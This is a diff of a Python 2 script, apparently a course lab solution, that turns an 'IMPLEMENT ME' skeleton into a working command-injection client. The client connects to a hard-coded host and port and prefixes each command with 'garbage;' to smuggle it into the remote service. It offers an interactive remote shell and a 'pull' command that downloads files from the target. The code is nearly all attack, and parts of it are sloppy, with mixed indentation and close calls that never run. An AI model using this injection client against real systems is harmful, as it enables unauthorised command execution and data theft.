@@ -8,30 +8,80 @@
 """
 
 import socket
+import sys
+import time
 
 host = "cornerstoneairlines.co" # IP address here
 port = 45 # Port here
 
-def execute_cmd(cmd):
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+def execute_cmd(currPath, cmd):
 
-            # Establish socket connection
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((host, port))
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
+	
+	
 
-            Reading:
+	if (cmd == "help"):
+		print "shell: drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell"
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
+	elif "pull" in cmd:
+		pullCmds = str.split(cmd)           
+		f = open(pullCmds[2], "w+")
 
-            Sending:
+		s.recv(1024)
+		s.send("garbage; cd " + currPath + " ;" + pullCmds[1] + "\n")
+		time.sleep(3)
+		data = s.recv(1024)
+		
+		f.write(data)
 
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-    """
-    print("IMPLEMENT ME")
+                  
+	else:
+		s.recv(1024)
+		s.send("garbage; cd " + currPath + " ;" + cmd + "\n")
+		time.sleep(3)
+		data = s.recv(1024)
+		print(data)
 
+ 	s.close
+		
 
 if __name__ == '__main__':
-    print("IMPLEMENT ME")
+
+    outer = True;
+    inner = True;
+    
+    
+    while (outer == True):
+
+       cmd = raw_input(">")
+       currPath = "/"
+       if (cmd == "shell"):
+
+         while (inner != False):
+
+           cmd = raw_input(currPath + ">")
+
+           if cmd == "exit":
+              inner = False
+		
+           elif "cd" in cmd: 
+ 		currPath = cmd[3: ] 
+
+           else:
+              execute_cmd(currPath, cmd)
+
+       if cmd == "quit":
+	  exit()
+          s.close()
+
+
+
+
+
+
+
+
+
+
+
